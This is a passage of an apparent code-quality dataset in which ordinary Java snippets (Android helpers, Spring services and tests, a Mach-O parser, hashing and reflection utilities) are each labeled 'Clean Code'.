 */
public class TabList implements Scoreboard {
  /** 
 * <b>WARNING:</b> You shouldn't create scoreboards with the same prefix as those
 */
  private static final String TAB_LIST_PREFIX=""tl-"";
  private final Set<Player> viewers=new CopyOnWriteArraySet<>();
  private final Set<Player> unmodifiableViewers=Collections.unmodifiableSet(viewers);
  private final String objectiveName;
  private ScoreboardObjectivePacket.Type type;
  public TabList(  String name,  ScoreboardObjectivePacket.Type type){
    this.objectiveName=TAB_LIST_PREFIX + name;
    this.type=type;
  }
  /** 
 * Gets the scoreboard objective type
 * @return the scoreboard objective type
 */
  public ScoreboardObjectivePacket.Type getType(){
    return type;
  }
  /** 
 * Changes the scoreboard objective type
 * @param type The new type for the objective
 */
  public void setType(  ScoreboardObjectivePacket.Type type){
    this.type=type;
  }
  @Override public boolean addViewer(  @NotNull Player player){
    final boolean result=this.viewers.add(player);
    if (result) {
      player.sendPacket(this.getCreationObjectivePacket(Component.empty(),this.type));
      player.sendPacket(this.getDisplayScoreboardPacket((byte)0));
    }
    return result;
  }
  @Override public boolean removeViewer(  @NotNull Player player){
    final boolean result=this.viewers.remove(player);
    if (result) {
      player.sendPacket(this.getDestructionObjectivePacket());
    }
    return result;
  }
  @NotNull @Override public Set<Player> getViewers(){
    return unmodifiableViewers;
  }
  @Override public String getObjectiveName(){
    return this.objectiveName;
  }
}
",0,Clean Code
"/** 
 * Helper for accessing features in  {@link Environment}.
 */
public final class EnvironmentCompat {
  private static final String TAG=""EnvironmentCompat"";
  /** 
 * Unknown storage state, such as when a path isn't backed by known storage media.
 * @see #getStorageState(File)
 */
  public static final String MEDIA_UNKNOWN=""unknown"";
  /** 
 * Returns the current state of the storage device that provides the given path.
 * @return one of {@link #MEDIA_UNKNOWN},  {@link Environment#MEDIA_REMOVED}, {@link Environment#MEDIA_UNMOUNTED}, {@link Environment#MEDIA_CHECKING}, {@link Environment#MEDIA_NOFS}, {@link Environment#MEDIA_MOUNTED}, {@link Environment#MEDIA_MOUNTED_READ_ONLY}, {@link Environment#MEDIA_SHARED}, {@link Environment#MEDIA_BAD_REMOVAL}, or {@link Environment#MEDIA_UNMOUNTABLE}.
 */
  public static String getStorageState(  File path){
    if (Build.VERSION.SDK_INT >= 19) {
      return Environment.getStorageState(path);
    }
    try {
      final String canonicalPath=path.getCanonicalPath();
      final String canonicalExternal=Environment.getExternalStorageDirectory().getCanonicalPath();
      if (canonicalPath.startsWith(canonicalExternal)) {
        return Environment.getExternalStorageState();
      }
    }
 catch (    IOException e) {
      Log.w(TAG,""Failed to resolve canonical path: "" + e);
    }
    return MEDIA_UNKNOWN;
  }
  private EnvironmentCompat(){
  }
}
",0,Clean Code
"/** 
 * The type Swagger index transformer.
 * @author bnasslahsen
 */
public class SwaggerIndexPageTransformer extends AbstractSwaggerIndexTransformer implements SwaggerIndexTransformer {
  /** 
 * The Swagger welcome common.
 */
  private final SwaggerWelcomeCommon swaggerWelcomeCommon;
  /** 
 * Instantiates a new Swagger index transformer.
 * @param swaggerUiConfig          the swagger ui config
 * @param swaggerUiOAuthProperties the swagger ui o auth properties
 * @param swaggerWelcomeCommon     the swagger welcome common
 * @param objectMapperProvider     the object mapper provider
 */
  public SwaggerIndexPageTransformer(  SwaggerUiConfigProperties swaggerUiConfig,  SwaggerUiOAuthProperties swaggerUiOAuthProperties,  SwaggerWelcomeCommon swaggerWelcomeCommon,  ObjectMapperProvider objectMapperProvider){
    super(swaggerUiConfig,swaggerUiOAuthProperties,objectMapperProvider);
    this.swaggerWelcomeCommon=swaggerWelcomeCommon;
  }
  @Override public Mono<Resource> transform(  ServerWebExchange serverWebExchange,  Resource resource,  ResourceTransformerChain resourceTransformerChain){
    SwaggerUiConfigParameters swaggerUiConfigParameters=new SwaggerUiConfigParameters(swaggerUiConfig);
    swaggerWelcomeCommon.buildFromCurrentContextPath(swaggerUiConfigParameters,serverWebExchange.getRequest());
    final AntPathMatcher antPathMatcher=new AntPathMatcher();
    try {
      boolean isIndexFound=antPathMatcher.match(""**/swagger-ui/**/"" + SWAGGER_INITIALIZER_JS,resource.getURL().toString());
      if (isIndexFound) {
        String html=defaultTransformations(swaggerUiConfigParameters,resource.getInputStream());
        return Mono.just(new TransformedResource(resource,html.getBytes(StandardCharsets.UTF_8)));
      }
 else {
        return Mono.just(resource);
      }
    }
 catch (    Exception e) {
      throw new SpringDocUIException(""Failed to transform Index"",e);
    }
  }
}
",0,Clean Code
"/** 
 * Tests for  {@link ScopedProxyBeanRegistrationWriterSupplier}.
 * @author Stephane Nicoll
 */
class ScopedProxyBeanRegistrationWriterSupplierTests {
  @Test void getWithNonScopedProxy(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    BeanDefinition beanDefinition=BeanDefinitionBuilder.rootBeanDefinition(PropertiesFactoryBean.class).getBeanDefinition();
    assertThat(getBeanRegistrationWriter(beanFactory,""test"",beanDefinition)).isNull();
  }
  @Test void getWithScopedProxyWithoutTargetBeanName(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    BeanDefinition scopeBean=BeanDefinitionBuilder.rootBeanDefinition(ScopedProxyFactoryBean.class).getBeanDefinition();
    assertThat(getBeanRegistrationWriter(beanFactory,""test"",scopeBean)).isNull();
  }
  @Test void getWithScopedProxyWithInvalidTargetBeanName(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    BeanDefinition scopeBean=BeanDefinitionBuilder.rootBeanDefinition(ScopedProxyFactoryBean.class).addPropertyValue(""targetBeanName"",""testDoesNotExist"").getBeanDefinition();
    assertThat(getBeanRegistrationWriter(beanFactory,""test"",scopeBean)).isNull();
  }
  @Test void getWithScopedProxyWithTargetBeanName(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    BeanDefinition targetBean=BeanDefinitionBuilder.rootBeanDefinition(SimpleComponent.class).getBeanDefinition();
    beanFactory.registerBeanDefinition(""simpleComponent"",targetBean);
    BeanDefinition scopeBean=BeanDefinitionBuilder.rootBeanDefinition(ScopedProxyFactoryBean.class).addPropertyValue(""targetBeanName"",""simpleComponent"").getBeanDefinition();
    assertThat(getBeanRegistrationWriter(beanFactory,""test"",scopeBean)).isNotNull();
  }
  @Test void writeBeanRegistrationForScopedProxy(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    RootBeanDefinition targetBean=new RootBeanDefinition();
    targetBean.setTargetType(ResolvableType.forClassWithGenerics(NumberHolder.class,Integer.class));
    targetBean.setScope(""custom"");
    beanFactory.registerBeanDefinition(""numberHolder"",targetBean);
    BeanDefinition scopeBean=BeanDefinitionBuilder.rootBeanDefinition(ScopedProxyFactoryBean.class).addPropertyValue(""targetBeanName"",""numberHolder"").getBeanDefinition();
    assertThat(writeBeanRegistration(beanFactory,""test"",scopeBean)).lines().containsOnly(""BeanDefinitionRegistrar.of(\""test\"", ResolvableType.forClassWithGenerics(NumberHolder.class, Integer.class))"",""    .instanceSupplier(() ->  {"",""      ScopedProxyFactoryBean factory = new ScopedProxyFactoryBean();"",""      factory.setTargetBeanName(\""numberHolder\"");"",""      factory.setBeanFactory(beanFactory);"",""      return factory.getObject();"",""    }).register(beanFactory);"");
  }
  private CodeSnippet writeBeanRegistration(  BeanFactory beanFactory,  String beanName,  BeanDefinition beanDefinition){
    return CodeSnippet.of((code) -> getBeanRegistrationWriter(beanFactory,beanName,beanDefinition).writeBeanRegistration(new DefaultBootstrapWriterContext(""com.example"",""Test""),code));
  }
  BeanRegistrationWriter getBeanRegistrationWriter(  BeanFactory beanFactory,  String beanName,  BeanDefinition beanDefinition){
    ScopedProxyBeanRegistrationWriterSupplier supplier=new ScopedProxyBeanRegistrationWriterSupplier();
    supplier.setBeanFactory(beanFactory);
    return supplier.get(beanName,beanDefinition);
  }
}
",0,Clean Code
"/** 
 * 岗位信息 服务层处理
 * @author AllDataDC
 */
@Service public class InstanceServiceImpl implements IInstanceService {
  @Autowired private InstanceMapper instanceMapper;
  @Autowired private DbconfigMapper dbconfigMapper;
  @Autowired private JobconfigMapper jobconfigMapper;
  @Override public List<Instance> selectInstanceList(  Instance instance){
    return instanceMapper.selectInstanceList(instance);
  }
  @Override public List<Instance> selectInstanceAll(){
    return instanceMapper.selectInstanceAll();
  }
  @Override public Instance selectInstanceById(  Long id){
    return instanceMapper.selectInstanceById(id);
  }
  @Override public List<String> selectDbTypesAll(){
    List<String> list=new ArrayList<>();
    for (    DbTypeEnum dbTypeEnum : DbTypeEnum.values()) {
      list.add(dbTypeEnum.getType());
    }
    return list;
  }
  @Override public int insertInstance(  Instance instance){
    return instanceMapper.insertInstance(instance);
  }
  @Override public int countUserPostById(  Long postId){
    return 0;
  }
  @Override public void runJob(  String ids) throws Exception {
    Long[] idsArray=Convert.toLongArray(ids);
    for (    Long id : idsArray) {
      Jobconfig jobconfig=jobconfigMapper.selectJobconfigById(id);
      Dbconfig dbconfig=dbconfigMapper.selectDbconfigById(jobconfig.getDbConfigId());
      Instance instance=RunUtil.run(dbconfig,jobconfig);
      instance.setJobconfigId(id);
      instanceMapper.insertInstance(instance);
    }
  }
  @Override public List<LinkedHashMap<String,String>> getDiffDetail(  Long id) throws Exception {
    Instance instance=instanceMapper.selectInstanceById(id);
    Jobconfig jobconfig=jobconfigMapper.selectJobconfigById(instance.getJobconfigId());
    Dbconfig dbconfig=dbconfigMapper.selectDbconfigById(jobconfig.getDbConfigId());
    List<LinkedHashMap<String,String>> list=RunUtil.runDiffDetail(dbconfig,jobconfig);
    return list;
  }
}",0,Clean Code
"public class BrandUtil {
  /** 
 * Xiaomi device
 */
  public static boolean isBrandXiaoMi(){
    return ""xiaomi"".equalsIgnoreCase(getBuildBrand()) || ""xiaomi"".equalsIgnoreCase(getBuildManufacturer());
  }
  /** 
 * oppo device
 * @return
 */
  public static boolean isBrandOppo(){
    return ""oppo"".equalsIgnoreCase(getBuildBrand()) || ""realme"".equalsIgnoreCase(getBuildBrand()) || ""oneplus"".equalsIgnoreCase(getBuildBrand())|| ""oppo"".equalsIgnoreCase(getBuildManufacturer())|| ""realme"".equalsIgnoreCase(getBuildManufacturer())|| ""oneplus"".equalsIgnoreCase(getBuildManufacturer());
  }
  /** 
 * oppo device
 * @return
 */
  public static boolean isSamsungS9Series(){
    return ""samsung"".equalsIgnoreCase(getBuildBrand()) && (!TextUtils.isEmpty(getBuildModel()) && (getBuildModel().startsWith(""SM-G965"") || getBuildModel().startsWith(""SM-G960"")));
  }
  public static String getBuildBrand(){
    return TUIBuild.getBrand();
  }
  public static String getBuildManufacturer(){
    return TUIBuild.getManufacturer();
  }
  public static String getBuildModel(){
    return TUIBuild.getModel();
  }
  public static String getBuildVersionRelease(){
    return TUIBuild.getVersion();
  }
  public static int getBuildVersionSDKInt(){
    return TUIBuild.getVersionInt();
  }
}
",0,Clean Code
"/** 
 * string 转为 LocalDateTime 配置类
 * @author 卓大
 */
@Configuration public static class StringToLocalDateTime implements Converter<String,LocalDateTime> {
  @Override public LocalDateTime convert(  String str){
    if (StringUtils.isBlank(str)) {
      return null;
    }
    LocalDateTime localDateTime;
    try {
      localDateTime=LocalDateTimeUtil.parse(str,DatePattern.NORM_DATETIME_FORMAT.getDateTimeFormatter());
    }
 catch (    DateTimeParseException e) {
      throw new RuntimeException(""请输入正确的日期格式：yyyy-MM-dd HH:mm:ss"");
    }
    return localDateTime;
  }
}
/** 
 * string 转为 LocalDateTime 配置类
 * @author 卓大
 */
@Configuration public static class StringToLocalDateTime implements Converter<String,LocalDateTime> {
  @Override public LocalDateTime convert(  String str){
    if (StringUtils.isBlank(str)) {
      return null;
    }
    LocalDateTime localDateTime;
    try {
      localDateTime=LocalDateTimeUtil.parse(str,DatePattern.NORM_DATETIME_FORMAT.getDateTimeFormatter());
    }
 catch (    DateTimeParseException e) {
      throw new RuntimeException(""请输入正确的日期格式：yyyy-MM-dd HH:mm:ss"");
    }
    return localDateTime;
  }
}
",0,Clean Code
"/** 
 * A  {@link Transformation} that can apply a wrapped {@link Bitmap}transformation to both  {@link Bitmap}s and  {@link GifDrawable}.
 */
public class GifBitmapWrapperTransformation implements Transformation<GifBitmapWrapper> {
  private final Transformation<Bitmap> bitmapTransformation;
  private final Transformation<GifDrawable> gifDataTransformation;
  public GifBitmapWrapperTransformation(  BitmapPool bitmapPool,  Transformation<Bitmap> bitmapTransformation){
    this(bitmapTransformation,new GifDrawableTransformation(bitmapTransformation,bitmapPool));
  }
  GifBitmapWrapperTransformation(  Transformation<Bitmap> bitmapTransformation,  Transformation<GifDrawable> gifDataTransformation){
    this.bitmapTransformation=bitmapTransformation;
    this.gifDataTransformation=gifDataTransformation;
  }
  @Override public Resource<GifBitmapWrapper> transform(  Resource<GifBitmapWrapper> resource,  int outWidth,  int outHeight){
    Resource<Bitmap> bitmapResource=resource.get().getBitmapResource();
    Resource<GifDrawable> gifResource=resource.get().getGifResource();
    if (bitmapResource != null && bitmapTransformation != null) {
      Resource<Bitmap> transformed=bitmapTransformation.transform(bitmapResource,outWidth,outHeight);
      if (!bitmapResource.equals(transformed)) {
        GifBitmapWrapper gifBitmap=new GifBitmapWrapper(transformed,resource.get().getGifResource());
        return new GifBitmapWrapperResource(gifBitmap);
      }
    }
 else     if (gifResource != null && gifDataTransformation != null) {
      Resource<GifDrawable> transformed=gifDataTransformation.transform(gifResource,outWidth,outHeight);
      if (!gifResource.equals(transformed)) {
        GifBitmapWrapper gifBitmap=new GifBitmapWrapper(resource.get().getBitmapResource(),transformed);
        return new GifBitmapWrapperResource(gifBitmap);
      }
    }
    return resource;
  }
  @Override public String getId(){
    return bitmapTransformation.getId();
  }
}
",0,Clean Code
"public static class CodeSignatureCommand extends KaitaiStruct {
  public static CodeSignatureCommand fromFile(  String fileName) throws IOException {
    return new CodeSignatureCommand(new ByteBufferKaitaiStream(fileName));
  }
  public CodeSignatureCommand(  KaitaiStream _io){
    this(_io,null,null);
  }
  public CodeSignatureCommand(  KaitaiStream _io,  MachO.LoadCommand _parent){
    this(_io,_parent,null);
  }
  public CodeSignatureCommand(  KaitaiStream _io,  MachO.LoadCommand _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.dataOff=this._io.readU4le();
    this.dataSize=this._io.readU4le();
  }
  private CsBlob codeSignature;
  public CsBlob codeSignature(){
    if (this.codeSignature != null)     return this.codeSignature;
    KaitaiStream io=_root._io();
    long _pos=io.pos();
    io.seek(dataOff());
    this._raw_codeSignature=io.readBytes(dataSize());
    KaitaiStream _io__raw_codeSignature=new ByteBufferKaitaiStream(_raw_codeSignature);
    this.codeSignature=new CsBlob(_io__raw_codeSignature,this,_root);
    io.seek(_pos);
    return this.codeSignature;
  }
  private long dataOff;
  private long dataSize;
  private MachO _root;
  private MachO.LoadCommand _parent;
  private byte[] _raw_codeSignature;
  public long dataOff(){
    return dataOff;
  }
  public long dataSize(){
    return dataSize;
  }
  public MachO _root(){
    return _root;
  }
  public MachO.LoadCommand _parent(){
    return _parent;
  }
  public byte[] _raw_codeSignature(){
    return _raw_codeSignature;
  }
}
",0,Clean Code
"/** 
 * Information about the original version and the obfuscated version of a method (without the obfuscated class name or method name).
 */
private static class MethodInfo {
  private final int obfuscatedFirstLineNumber;
  private final int obfuscatedLastLineNumber;
  private final String originalClassName;
  private final int originalFirstLineNumber;
  private final int originalLastLineNumber;
  private final String originalType;
  private final String originalName;
  private final String originalArguments;
  /** 
 * Creates a new MethodInfo with the given properties.
 */
  private MethodInfo(  int obfuscatedFirstLineNumber,  int obfuscatedLastLineNumber,  String originalClassName,  int originalFirstLineNumber,  int originalLastLineNumber,  String originalType,  String originalName,  String originalArguments){
    this.obfuscatedFirstLineNumber=obfuscatedFirstLineNumber;
    this.obfuscatedLastLineNumber=obfuscatedLastLineNumber;
    this.originalType=originalType;
    this.originalArguments=originalArguments;
    this.originalClassName=originalClassName;
    this.originalName=originalName;
    this.originalFirstLineNumber=originalFirstLineNumber;
    this.originalLastLineNumber=originalLastLineNumber;
  }
  /** 
 * Returns whether the given properties match the properties of this method. The given properties may be null wildcards.
 */
  private boolean matches(  int obfuscatedLineNumber,  String originalType,  String originalArguments){
    return (obfuscatedLineNumber == 0 || obfuscatedLastLineNumber == 0 || (obfuscatedFirstLineNumber <= obfuscatedLineNumber && obfuscatedLineNumber <= obfuscatedLastLineNumber)) && (originalType == null || originalType.equals(this.originalType)) && (originalArguments == null || originalArguments.equals(this.originalArguments));
  }
}",0,Clean Code
"/** 
 * 系统配置 服务接口
 * @author geekidea
 * @since 2023-11-27
 */
public interface SysConfigService extends IService<SysConfig> {
  /** 
 * 添加系统配置
 * @param dto
 * @return
 * @throws Exception
 */
  boolean addSysConfig(  SysConfigDto dto);
  /** 
 * 修改系统配置
 * @param dto
 * @return
 * @throws Exception
 */
  boolean updateSysConfig(  SysConfigDto dto);
  /** 
 * 删除系统配置
 * @param id
 * @return
 * @throws Exception
 */
  boolean deleteSysConfig(  Long id);
  /** 
 * 系统配置详情
 * @param id
 * @return
 * @throws Exception
 */
  SysConfigVo getSysConfigById(  Long id);
  /** 
 * 系统配置分页列表
 * @param query
 * @return
 * @throws Exception
 */
  Paging<SysConfigVo> getSysConfigPage(  SysConfigQuery query);
  /** 
 * 检查configKey是否存在
 * @param configKey
 * @return
 * @throws Exception
 */
  void checkConfigKeyExists(  String configKey);
}",0,Clean Code
"/** 
 * {@code RandomSampler} is an implementation of the {@link ai.djl.training.dataset.Sampler.SubSampler} interface.<p> {@code RandomSampler} samples the data from [0, dataset.size) randomly.
 */
public class RandomSampler implements Sampler.SubSampler {
  private static void swap(  long[] arr,  int i,  int j){
    long tmp=arr[i];
    arr[i]=arr[j];
    arr[j]=tmp;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Iterator<Long> sample(  RandomAccessDataset dataset){
    return new Iterate(dataset);
  }
static class Iterate implements Iterator<Long> {
    private long[] indices;
    private long current;
    Iterate(    RandomAccessDataset dataset){
      long size=dataset.size();
      current=0;
      indices=LongStream.range(0,size).toArray();
      for (int i=Math.toIntExact(size) - 1; i > 0; --i) {
        swap(indices,i,RandomUtils.nextInt(i));
      }
    }
    /** 
 * {@inheritDoc} 
 */
    @Override public boolean hasNext(){
      return current < indices.length;
    }
    /** 
 * {@inheritDoc} 
 */
    @Override public Long next(){
      if (!hasNext()) {
        throw new NoSuchElementException();
      }
      return indices[Math.toIntExact(current++)];
    }
  }
}
",0,Clean Code
"/** 
 * @explain JAVA反射工具类
 * @author Song
 * @date 2019/12/17
 */
public class ReflectionUtil {
  /** 
 * 获取私有成员变量的值
 * @param instance 要获取的对象
 * @param filedName 获取的变量名称
 * @return 返回获取变量的信息（需要强转）
 */
  public static Object getPrivateField(  Object instance,  String filedName) throws NoSuchFieldException, IllegalAccessException {
    Field field=instance.getClass().getDeclaredField(filedName);
    field.setAccessible(true);
    return field.get(instance);
  }
  /** 
 * 设置私有成员的值
 * @param instance 要获取的对象
 * @param fieldName 要获取的变量名
 * @param value 设置的值
 */
  public static void setPrivateField(  Object instance,  String fieldName,  Object value) throws NoSuchFieldException, IllegalAccessException {
    Field field=instance.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(instance,value);
  }
  /** 
 * 访问私有方法
 * @param instance 要获取的对象
 * @param methodName 私有方法的名称
 * @param classes  CLASS的返回信息
 * @param objects 参数信息
 * @return
 */
  public static Object invokePrivateMethod(  Object instance,  String methodName,  Class[] classes,  String objects) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
    Method method=instance.getClass().getDeclaredMethod(methodName,classes);
    method.setAccessible(true);
    return method.invoke(instance,objects);
  }
}
",0,Clean Code
"public class HexagonalArchitecture extends ArchitectureElement {
  private Adapters adapters;
  private ApplicationLayer applicationLayer;
  private String configurationPackage;
  private List<String> domainPackages=new ArrayList<>();
  public static HexagonalArchitecture basePackage(  String basePackage){
    return new HexagonalArchitecture(basePackage);
  }
  public HexagonalArchitecture(  String basePackage){
    super(basePackage);
  }
  public Adapters withAdaptersLayer(  String adaptersPackage){
    this.adapters=new Adapters(this,fullQualifiedPackage(adaptersPackage));
    return this.adapters;
  }
  public HexagonalArchitecture withDomainLayer(  String domainPackage){
    this.domainPackages.add(fullQualifiedPackage(domainPackage));
    return this;
  }
  public ApplicationLayer withApplicationLayer(  String applicationPackage){
    this.applicationLayer=new ApplicationLayer(fullQualifiedPackage(applicationPackage),this);
    return this.applicationLayer;
  }
  public HexagonalArchitecture withConfiguration(  String packageName){
    this.configurationPackage=fullQualifiedPackage(packageName);
    return this;
  }
  private void domainDoesNotDependOnAdapters(  JavaClasses classes){
    denyAnyDependency(this.domainPackages,Collections.singletonList(adapters.basePackage),classes);
  }
  public void check(  JavaClasses classes){
    this.adapters.doesNotContainEmptyPackages();
    this.adapters.dontDependOnEachOther(classes);
    this.adapters.doesNotDependOn(this.configurationPackage,classes);
    this.applicationLayer.doesNotContainEmptyPackages();
    this.applicationLayer.doesNotDependOn(this.adapters.getBasePackage(),classes);
    this.applicationLayer.doesNotDependOn(this.configurationPackage,classes);
    this.applicationLayer.incomingAndOutgoingPortsDoNotDependOnEachOther(classes);
    this.domainDoesNotDependOnAdapters(classes);
  }
}
",0,Clean Code
"public class LinkisKeysTest {
  @Test @DisplayName(""constTest"") public void constTest(){
    String keyCodetype=LinkisKeys.KEY_CODETYPE;
    String keyCode=LinkisKeys.KEY_CODE;
    String keyVars=LinkisKeys.KEY_VARS;
    String keyConf=LinkisKeys.KEY_CONF;
    String keyScriptPath=LinkisKeys.KEY_SCRIPT_PATH;
    String keyEnginetype=LinkisKeys.KEY_ENGINETYPE;
    String keyUserCreator=LinkisKeys.KEY_USER_CREATOR;
    String keyErrorCode=LinkisKeys.KEY_ERROR_CODE;
    String keyErrorDesc=LinkisKeys.KEY_ERROR_DESC;
    String keyStrongerExecid=LinkisKeys.KEY_STRONGER_EXECID;
    String keyRequestapp=LinkisKeys.KEY_REQUESTAPP;
    String keyExecid=LinkisKeys.KEY_EXECID;
    String keyUmuser=LinkisKeys.KEY_UMUSER;
    String keyExecuteonce=LinkisKeys.KEY_EXECUTEONCE;
    Assertions.assertEquals(""codeType"",keyCodetype);
    Assertions.assertEquals(""code"",keyCode);
    Assertions.assertEquals(""variables"",keyVars);
    Assertions.assertEquals(""configuration"",keyConf);
    Assertions.assertEquals(""scriptPath"",keyScriptPath);
    Assertions.assertEquals(""engineType"",keyEnginetype);
    Assertions.assertEquals(""userCreator"",keyUserCreator);
    Assertions.assertEquals(""errCode"",keyErrorCode);
    Assertions.assertEquals(""errDesc"",keyErrorDesc);
    Assertions.assertEquals(""strongerExecId"",keyStrongerExecid);
    Assertions.assertEquals(""requestApplicationName"",keyRequestapp);
    Assertions.assertEquals(""execId"",keyExecid);
    Assertions.assertEquals(""umUser"",keyUmuser);
    Assertions.assertEquals(""executeOnce"",keyExecuteonce);
  }
}
",0,Clean Code
"public class MD5Utils {
  private final static String[] strDigits={""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""a"",""b"",""c"",""d"",""e"",""f""};
  private static String byteToArrayString(  byte bByte){
    int iRet=bByte;
    if (iRet < 0) {
      iRet+=256;
    }
    int iD1=iRet / 16;
    int iD2=iRet % 16;
    return strDigits[iD1] + strDigits[iD2];
  }
  private static String byteToNum(  byte bByte){
    int iRet=bByte;
    System.out.println(""iRet1="" + iRet);
    if (iRet < 0) {
      iRet+=256;
    }
    return String.valueOf(iRet);
  }
  private static String byteToString(  byte[] bByte){
    StringBuffer sBuffer=new StringBuffer();
    for (int i=0; i < bByte.length; i++) {
      sBuffer.append(byteToArrayString(bByte[i]));
    }
    return sBuffer.toString();
  }
  public static String GetMD5Code(  String strObj){
    String resultString=null;
    try {
      resultString=new String(strObj);
      MessageDigest md=MessageDigest.getInstance(""MD5"");
      resultString=byteToString(md.digest(strObj.getBytes()));
    }
 catch (    NoSuchAlgorithmException ex) {
      ex.printStackTrace();
    }
    return resultString;
  }
  public static String SHA1(  String decript){
    try {
      MessageDigest digest=MessageDigest.getInstance(""SHA-1"");
      digest.update(decript.getBytes(""utf-8""));
      byte messageDigest[]=digest.digest();
      StringBuffer hexString=new StringBuffer();
      for (int i=0; i < messageDigest.length; i++) {
        String shaHex=Integer.toHexString(messageDigest[i] & 0xFF);
        if (shaHex.length() < 2) {
          hexString.append(0);
        }
        hexString.append(shaHex);
      }
      return hexString.toString();
    }
 catch (    NoSuchAlgorithmException e) {
      e.printStackTrace();
    }
catch (    UnsupportedEncodingException e) {
      e.printStackTrace();
    }
    return """";
  }
}",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class DefaultFixedThreadsExecutorGroupFactory implements FixedThreadsExecutorGroupFactory {
  public static final DefaultFixedThreadsExecutorGroupFactory INSTANCE=new DefaultFixedThreadsExecutorGroupFactory();
  @Override public FixedThreadsExecutorGroup newExecutorGroup(  final int nThreads,  final String poolName,  final int maxPendingTasksPerThread){
    return newExecutorGroup(nThreads,poolName,maxPendingTasksPerThread,false);
  }
  @Override public FixedThreadsExecutorGroup newExecutorGroup(  final int nThreads,  final String poolName,  final int maxPendingTasksPerThread,  final boolean useMpscQueue){
    Requires.requireTrue(nThreads > 0,""nThreads must > 0"");
    final boolean mpsc=useMpscQueue && Utils.USE_MPSC_SINGLE_THREAD_EXECUTOR;
    final SingleThreadExecutor[] children=new SingleThreadExecutor[nThreads];
    final ThreadFactory threadFactory=mpsc ? new NamedThreadFactory(poolName,true) : null;
    for (int i=0; i < nThreads; i++) {
      if (mpsc) {
        children[i]=new MpscSingleThreadExecutor(maxPendingTasksPerThread,threadFactory);
      }
 else {
        children[i]=new DefaultSingleThreadExecutor(poolName,maxPendingTasksPerThread);
      }
    }
    return new DefaultFixedThreadsExecutorGroup(children);
  }
  @Override public FixedThreadsExecutorGroup newExecutorGroup(  final SingleThreadExecutor[] children){
    return new DefaultFixedThreadsExecutorGroup(children);
  }
  @Override public FixedThreadsExecutorGroup newExecutorGroup(  final SingleThreadExecutor[] children,  final ExecutorChooserFactory.ExecutorChooser chooser){
    return new DefaultFixedThreadsExecutorGroup(children,chooser);
  }
  @Override public FixedThreadsExecutorGroup newExecutorGroup(  final ExecutorService[] children){
    return new DefaultFixedThreadsExecutorGroup(children);
  }
  @Override public FixedThreadsExecutorGroup newExecutorGroup(  final ExecutorService[] children,  final ExecutorChooserFactory.ExecutorChooser chooser){
    return new DefaultFixedThreadsExecutorGroup(children,chooser);
  }
  private DefaultFixedThreadsExecutorGroupFactory(){
  }
}",0,Clean Code
"/** 
 * 首页内容管理Controller Created by macro on 2019/1/28.
 */
@Controller @Tag(name=""HomeController"",description=""首页内容管理"") @RequestMapping(""/home"") public class HomeController {
  @Autowired private HomeService homeService;
  @Operation(summary=""首页内容页信息展示"") @RequestMapping(value=""/content"",method=RequestMethod.GET) @ResponseBody public CommonResult<HomeContentResult> content(){
    HomeContentResult contentResult=homeService.content();
    return CommonResult.success(contentResult);
  }
  @Operation(summary=""分页获取推荐商品"") @RequestMapping(value=""/recommendProductList"",method=RequestMethod.GET) @ResponseBody public CommonResult<List<PmsProduct>> recommendProductList(  @RequestParam(value=""pageSize"",defaultValue=""4"") Integer pageSize,  @RequestParam(value=""pageNum"",defaultValue=""1"") Integer pageNum){
    List<PmsProduct> productList=homeService.recommendProductList(pageSize,pageNum);
    return CommonResult.success(productList);
  }
  @Operation(summary=""获取首页商品分类"") @RequestMapping(value=""/productCateList/{parentId}"",method=RequestMethod.GET) @ResponseBody public CommonResult<List<PmsProductCategory>> getProductCateList(  @PathVariable Long parentId){
    List<PmsProductCategory> productCategoryList=homeService.getProductCateList(parentId);
    return CommonResult.success(productCategoryList);
  }
  @Operation(summary=""根据分类获取专题"") @RequestMapping(value=""/subjectList"",method=RequestMethod.GET) @ResponseBody public CommonResult<List<CmsSubject>> getSubjectList(  @RequestParam(required=false) Long cateId,  @RequestParam(value=""pageSize"",defaultValue=""4"") Integer pageSize,  @RequestParam(value=""pageNum"",defaultValue=""1"") Integer pageNum){
    List<CmsSubject> subjectList=homeService.getSubjectList(cateId,pageSize,pageNum);
    return CommonResult.success(subjectList);
  }
  @Operation(summary=""分页获取人气推荐商品"") @RequestMapping(value=""/hotProductList"",method=RequestMethod.GET) @ResponseBody public CommonResult<List<PmsProduct>> hotProductList(  @RequestParam(value=""pageNum"",defaultValue=""1"") Integer pageNum,  @RequestParam(value=""pageSize"",defaultValue=""6"") Integer pageSize){
    List<PmsProduct> productList=homeService.hotProductList(pageNum,pageSize);
    return CommonResult.success(productList);
  }
  @Operation(summary=""分页获取新品推荐商品"") @RequestMapping(value=""/newProductList"",method=RequestMethod.GET) @ResponseBody public CommonResult<List<PmsProduct>> newProductList(  @RequestParam(value=""pageNum"",defaultValue=""1"") Integer pageNum,  @RequestParam(value=""pageSize"",defaultValue=""6"") Integer pageSize){
    List<PmsProduct> productList=homeService.newProductList(pageNum,pageSize);
    return CommonResult.success(productList);
  }
}
",0,Clean Code
"public class RoundedImageSpan extends ReplacementSpan {
  private final int mBackgroundColor;
  private final int mCornerRadius;
  private final int mPadding;
  private final String mText;
  private final int mTextSize;
  public RoundedImageSpan(  String text,  int textSize,  int backgroundColor,  int cornerRadius,  int padding){
    mText=text;
    mTextSize=textSize;
    mBackgroundColor=backgroundColor;
    mCornerRadius=cornerRadius;
    mPadding=padding;
  }
  @Override public int getSize(  Paint paint,  CharSequence text,  int start,  int end,  Paint.FontMetricsInt fm){
    return (int)(paint.measureText(text,start,end) + mPadding * 2);
  }
  @Override public void draw(  @NonNull Canvas canvas,  CharSequence text,  int start,  int end,  float x,  int top,  int y,  int bottom,  @NonNull Paint paint){
    if (TextUtils.isEmpty(mText) || mText.length() <= 3) {
      return;
    }
